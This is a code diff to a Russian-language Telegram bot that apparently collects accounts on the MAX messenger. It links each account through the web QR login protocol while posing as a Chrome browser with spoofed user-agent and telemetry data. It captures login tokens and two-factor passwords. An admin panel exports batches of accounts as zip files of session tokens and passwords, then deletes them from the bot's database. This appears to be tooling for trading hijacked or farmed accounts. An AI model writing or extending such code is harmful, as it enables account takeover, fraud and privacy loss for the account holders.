@@ -424,6 +424,8 @@ class MaxRegistration:
 # ==================== WEB QR ====================
 
 class WebQRDeviceLink:
+    USER_AGENT = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36"
+
     def __init__(self, phone=None):
         self.phone = phone
         self.device_id = str(uuid.uuid4())
@@ -464,65 +466,104 @@ class WebQRDeviceLink:
                 opcode = data.get("opcode")
                 cmd = data.get("cmd")
 
-                if opcode == 288 and cmd == 1:
+                if opcode == 6 and cmd == 1:
+                    logging.info("[QR] Handshake confirmed")
+
+                elif opcode == 288 and cmd == 1:
                     self.qr_link = payload.get("qrLink")
                     self.qr_data = payload.get("qrData")
                     self.track_id = payload.get("trackId")
                     self._expires_at = payload.get("expiresAt")
+                    logging.info(f"[QR] QR received! Track ID: {self.track_id}")
                     self._send_events(ws)
                     self.qr_received.set()
                     self._check_qr_status(ws)
 
+                elif opcode == 288 and cmd == 3:
+                    error = payload.get("error", "Unknown")
+                    logging.error(f"[QR] QR error: {error}")
+                    self.running = False
+                    ws.close()
+
                 elif opcode == 289 and cmd == 1:
                     status = payload.get("status", {})
+                    logging.info(f"[QR] Status: {json.dumps(status, ensure_ascii=False)}")
                     if status.get("loginAvailable"):
+                        logging.info("[QR] QR scanned!")
                         self.scan_detected.set()
                         self._request_token(ws)
+                    elif not self.scan_detected.is_set() and not self.password_required.is_set():
+                        threading.Timer(2.0, lambda: self._check_qr_status(ws)).start()
 
                 elif opcode == 291 and cmd == 1:
                     if "passwordChallenge" in payload:
                         self._password_challenge = payload["passwordChallenge"]
+                        logging.info("[QR] 2FA password required!")
                         self.password_required.set()
                     elif "tokenAttrs" in payload:
                         token_data = payload["tokenAttrs"].get("LOGIN", {})
                         self.token = token_data.get("token")
                         if self.token:
+                            self._send_login(ws, self.token)
                             self.login_complete.set()
                             self.running = False
                             ws.close()
+
+                elif opcode == 115 and cmd == 1:
+                    if "tokenAttrs" in payload:
+                        token_data = payload["tokenAttrs"].get("LOGIN", {})
+                        self.token = token_data.get("token")
+                        if self.token:
+                            self._send_login(ws, self.token)
+                            self.login_complete.set()
+                            self.running = False
+                            ws.close()
+                    else:
+                        logging.error("[QR] 2FA error")
+                        self.running = False
+                        ws.close()
+
+                elif opcode == 5 and cmd == 1:
+                    logging.debug("[QR] Events confirmed")
 
                 elif opcode == 1:
                     pong = {"seq": self.get_seq(), "opcode": 1, "payload": {}, "ver": 11, "cmd": 0}
                     ws.send(json.dumps(pong))
 
-            except Exception:
-                pass
+            except Exception as e:
+                logging.error(f"[QR] Error: {e}")
 
         def on_open(ws):
             handshake = {
                 "seq": self.get_seq(), "opcode": 6,
                 "payload": {
                     "userAgent": {
-                        "deviceType": "WEB", "locale": "ru", "deviceLocale": "ru",
-                        "osVersion": "Linux", "deviceName": "Chrome",
-                        "headerUserAgent": "Mozilla/5.0",
+                        "deviceType": "WEB",
+                        "locale": "ru",
+                        "deviceLocale": "ru",
+                        "osVersion": "Linux x86_64",
+                        "deviceName": "Chrome",
+                        "headerUserAgent": self.USER_AGENT,
                         "appVersion": "26.5.10",
-                        "screen": "1080x1440 1.0x", "timezone": "Europe/Moscow"
+                        "screen": "1920x1080 1.0x",
+                        "timezone": "Europe/Moscow",
+                        "buildNumber": 26172
                     },
                     "deviceId": self.device_id
                 },
                 "ver": 11, "cmd": 0
             }
             ws.send(json.dumps(handshake))
-            time.sleep(0.5)
+            time.sleep(1)
             qr_request = {"seq": self.get_seq(), "opcode": 288, "payload": {}, "ver": 11, "cmd": 0}
             ws.send(json.dumps(qr_request))
 
         def on_close(ws, code, msg):
+            logging.info(f"[QR] WebSocket closed: {code}, {msg}")
             self.running = False
 
         def on_error(ws, error):
-            pass
+            logging.error(f"[QR] WebSocket error: {error}")
 
         self.ws = websocket.WebSocketApp(
             "wss://ws-api.oneme.ru/websocket",
@@ -530,7 +571,10 @@ class WebQRDeviceLink:
             on_message=on_message,
             on_close=on_close,
             on_error=on_error,
-            header=["Origin: https://web.max.ru"]
+            header=[
+                "Origin: https://web.max.ru",
+                f"User-Agent: {self.USER_AGENT}"
+            ]
         )
 
         ws_thread = threading.Thread(
@@ -539,6 +583,9 @@ class WebQRDeviceLink:
         )
         ws_thread.daemon = True
         ws_thread.start()
+
+        ping_thread = threading.Thread(target=self._ping_loop, daemon=True)
+        ping_thread.start()
 
         if not self.qr_received.wait(30):
             return None, None
@@ -552,42 +599,102 @@ class WebQRDeviceLink:
 
         return self.qr_data or self.qr_link, None
 
+    def _ping_loop(self):
+        while self.running:
+            time.sleep(25)
+            if not self.running or not self.ws:
+                break
+            try:
+                ping = {"seq": self.get_seq(), "opcode": 1, "payload": {}, "ver": 11, "cmd": 0}
+                self.ws.send(json.dumps(ping))
+            except:
+                break
+
     def _send_events(self, ws):
         now_ms = int(time.time() * 1000)
         events = {
             "seq": self.get_seq(), "opcode": 5,
             "payload": {
                 "events": [
-                    {"type": "NAV", "userId": -1, "time": now_ms, "sessionId": self._session_id, 
-                     "event": "COLD_START", "params": {"action_id": 1, "screen_to": 49}},
-                    {"event": "LOG", "type": "AUTH_QR", "time": now_ms + 100, "userId": -1,
-                     "sessionId": self._session_id, "params": {"qr_ts_ms": self._expires_at, "action": "web_qr_view"}},
-                    {"type": "NAV", "userId": -1, "time": now_ms + 200, "sessionId": self._session_id,
-                     "event": "GO", "params": {"action_id": 2, "screen_to": 1, "screen_from": 49, "prev_time": now_ms}}
+                    {
+                        "type": "NAV", "userId": -1, "time": now_ms,
+                        "sessionId": self._session_id, "event": "COLD_START",
+                        "params": {"action_id": 1, "screen_to": 49}
+                    },
+                    {
+                        "event": "LOG", "type": "AUTH_QR", "time": now_ms + 100,
+                        "userId": -1, "sessionId": self._session_id,
+                        "params": {"qr_ts_ms": self._expires_at, "action": "web_qr_view"}
+                    },
+                    {
+                        "type": "NAV", "userId": -1, "time": now_ms + 200,
+                        "sessionId": self._session_id, "event": "GO",
+                        "params": {"action_id": 2, "screen_to": 1, "screen_from": 49, "prev_time": now_ms}
+                    }
                 ]
             },
             "ver": 11, "cmd": 0
         }
         try:
             ws.send(json.dumps(events))
-        except:
-            pass
+        except Exception as e:
+            logging.error(f"[QR] Events error: {e}")
 
     def _check_qr_status(self, ws):
         if not self.running or self.login_complete.is_set() or self.scan_detected.is_set():
             return
         try:
-            check = {"seq": self.get_seq(), "opcode": 289, "payload": {"trackId": self.track_id}, "ver": 11, "cmd": 0}
+            check = {
+                "seq": self.get_seq(), "opcode": 289,
+                "payload": {"trackId": self.track_id},
+                "ver": 11, "cmd": 0
+            }
             ws.send(json.dumps(check))
-        except:
-            pass
+        except Exception as e:
+            logging.error(f"[QR] Status check error: {e}")
 
     def _request_token(self, ws):
         try:
-            request = {"seq": self.get_seq(), "opcode": 291, "payload": {"trackId": self.track_id}, "ver": 11, "cmd": 0}
+            request = {
+                "seq": self.get_seq(), "opcode": 291,
+                "payload": {"trackId": self.track_id},
+                "ver": 11, "cmd": 0
+            }
             ws.send(json.dumps(request))
-        except:
-            pass
+        except Exception as e:
+            logging.error(f"[QR] Token request error: {e}")
+
+    def _send_login(self, ws, token):
+        login = {
+            "ver": 11, "cmd": 0, "seq": self.get_seq(),
+            "opcode": 19,
+            "payload": {
+                "token": token,
+                "chatsCount": 40,
+                "interactive": True,
+                "chatsSync": 0,
+                "contactsSync": 0,
+                "presenceSync": -1,
+                "draftsSync": 0
+            }
+        }
+        ws.send(json.dumps(login))
+        logging.info("[QR] LOGIN sent")
+
+    def send_password(self, password: str) -> bool:
+        if not self.ws or not self._password_challenge:
+            return False
+        try:
+            request = {
+                "seq": self.get_seq(), "opcode": 115,
+                "payload": {"trackId": self.track_id, "password": password},
+                "ver": 11, "cmd": 0
+            }
+            self.ws.send(json.dumps(request))
+            return True
+        except Exception as e:
+            logging.error(f"[QR] Password send error: {e}")
+            return False
 
     def close(self):
         self.running = False
@@ -810,7 +917,8 @@ def admin_keyboard():
     builder.row(InlineKeyboardButton(text="📱 Сдать номер", callback_data="add_account"))
     builder.row(InlineKeyboardButton(text="👤 Профиль", callback_data="profile"))
     builder.row(InlineKeyboardButton(text="📚 Инструкция", callback_data="instruction"))
-    builder.row(InlineKeyboardButton(text="📦 Выгрузить аккаунты", callback_data="admin_zip"))
+    builder.row(InlineKeyboardButton(text="📦 Выгрузить ANDROID", callback_data="admin_zip_android"))
+    builder.row(InlineKeyboardButton(text="🌐 Выгрузить WEB", callback_data="admin_zip_web"))
     builder.row(InlineKeyboardButton(text="🔍 Проверить токены", callback_data="admin_check_tokens"))
     builder.row(InlineKeyboardButton(text="⚙️ Админ-панель", callback_data="admin_panel"))
     return builder.as_markup()
@@ -1292,8 +1400,8 @@ async def handle_convert_count(message: types.Message, state: FSMContext):
     await msg.edit_text(text, parse_mode="HTML")
     await state.clear()
 
-@dp.callback_query(F.data == "admin_zip")
-async def cb_admin_zip(callback: types.CallbackQuery, state: FSMContext):
+@dp.callback_query(F.data == "admin_zip_android")
+async def cb_admin_zip_android(callback: types.CallbackQuery, state: FSMContext):
     if callback.from_user.id != ADMIN_ID:
         return await callback.answer("❌ Только для админа", show_alert=True)
 
@@ -1301,12 +1409,30 @@ async def cb_admin_zip(callback: types.CallbackQuery, state: FSMContext):
     total = len(all_accs)
 
     if total == 0:
-        await callback.answer("❌ Нет аккаунтов для выгрузки", show_alert=True)
+        await callback.answer("❌ Нет аккаунтов", show_alert=True)
         return
 
     await state.set_state(AuthState.waiting_zip_count)
-    await state.update_data(zip_total=total)
-    await callback.message.answer(f"📦 Всего аккаунтов: <b>{total}</b>\nВведите количество для выгрузки:", parse_mode="HTML")
+    await state.update_data(zip_total=total, zip_type="android")
+    await callback.message.answer(f"📦 Всего ANDROID аккаунтов: <b>{total}</b>\nВведите количество для выгрузки:", parse_mode="HTML")
+    await callback.answer()
+
+@dp.callback_query(F.data == "admin_zip_web")
+async def cb_admin_zip_web(callback: types.CallbackQuery, state: FSMContext):
+    if callback.from_user.id != ADMIN_ID:
+        return await callback.answer("❌ Только для админа", show_alert=True)
+
+    all_accs = get_all_accounts_list()
+    web_accs = [a for a in all_accs if a.get("web_token")]
+    total = len(web_accs)
+
+    if total == 0:
+        await callback.answer("❌ Нет аккаунтов с WEB токенами", show_alert=True)
+        return
+
+    await state.set_state(AuthState.waiting_zip_count)
+    await state.update_data(zip_total=total, zip_type="web")
+    await callback.message.answer(f"🌐 Всего WEB аккаунтов: <b>{total}</b>\nВведите количество для выгрузки:", parse_mode="HTML")
     await callback.answer()
 
 @dp.message(AuthState.waiting_zip_count)
@@ -1321,43 +1447,52 @@ async def handle_zip_count(message: types.Message, state: FSMContext):
 
     data = await state.get_data()
     total = data.get("zip_total", 0)
+    zip_type = data.get("zip_type", "android")
 
     if count <= 0 or count > total:
         return await message.answer(f"❌ Введите число от 1 до {total}.")
 
     all_accs = get_all_accounts_list()
+    
+    if zip_type == "web":
+        all_accs = [a for a in all_accs if a.get("web_token")]
+    
     selected = all_accs[:count]
 
     zip_buffer = BytesIO()
     with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
         for acc in selected:
-            desktop = {
-                "token": acc["token"],
-                "web_token": acc.get("web_token", ""),
-                "deviceType": "ANDROID",
-                "appVersion": "26.17.1",
-                "osVersion": "Android 10",
-                "timezone": "Europe/Moscow",
-                "screen": "408dpi 1080x2292",
-                "pushDeviceType": "GCM",
-                "arch": "arm64-v8a",
-                "locale": "ru",
-                "buildNumber": 6712,
-                "deviceName": "Google Pixel 7",
-                "deviceLocale": "ru",
-                "deviceId": acc.get("device_id", "").replace('-', '')[:16],
-                "clientSessionId": int(time.time() * 1000),
-                "user": {
-                    "user_id": acc["user_id"],
-                    "phone": int(acc["phone"].replace("+", "")),
-                    "photo_id": None,
-                    "first_name": "",
-                    "last_name": ""
-                },
-                "password": acc.get("password", "")
-            }
-            filename = f"{acc['phone']}.json"
-            zf.writestr(filename, json.dumps(desktop, ensure_ascii=False, indent=4))
+            if zip_type == "android":
+                desktop = {
+                    "token": acc["token"],
+                    "deviceType": "ANDROID",
+                    "appVersion": "26.17.1",
+                    "osVersion": "Android 10",
+                    "timezone": "Europe/Moscow",
+                    "screen": "408dpi 1080x2292",
+                    "pushDeviceType": "GCM",
+                    "arch": "arm64-v8a",
+                    "locale": "ru",
+                    "buildNumber": 6712,
+                    "deviceName": "Google Pixel 7",
+                    "deviceLocale": "ru",
+                    "deviceId": acc.get("device_id", "").replace('-', '')[:16],
+                    "clientSessionId": int(time.time() * 1000),
+                    "user": {
+                        "user_id": acc["user_id"],
+                        "phone": int(acc["phone"].replace("+", "")),
+                        "photo_id": None,
+                        "first_name": "",
+                        "last_name": ""
+                    },
+                    "password": acc.get("password", "")
+                }
+                content = json.dumps(desktop, ensure_ascii=False, indent=4)
+            else:
+                content = acc["web_token"]
+            
+            filename = f"{acc['phone']}.txt"
+            zf.writestr(filename, content)
 
     zip_buffer.seek(0)
 
@@ -1365,12 +1500,13 @@ async def handle_zip_count(message: types.Message, state: FSMContext):
         remove_account(acc["uid"], acc["phone"])
     save_data()
 
+    label = "ANDROID" if zip_type == "android" else "WEB"
     await bot.send_document(
         ADMIN_ID,
-        BufferedInputFile(zip_buffer.getvalue(), filename=f"tokens_{count}.zip"),
-        caption=f"📦 Выгружено {count} аккаунтов"
+        BufferedInputFile(zip_buffer.getvalue(), filename=f"{label}_{count}.zip"),
+        caption=f"📦 Выгружено {count} {label} аккаунтов"
     )
-    await message.answer(f"✅ Выгружено <b>{count}</b> аккаунтов. Они удалены из базы.", parse_mode="HTML")
+    await message.answer(f"✅ Выгружено <b>{count}</b> {label} аккаунтов. Они удалены из базы.", parse_mode="HTML")
     await state.clear()
 
 @dp.callback_query(F.data == "add_account")
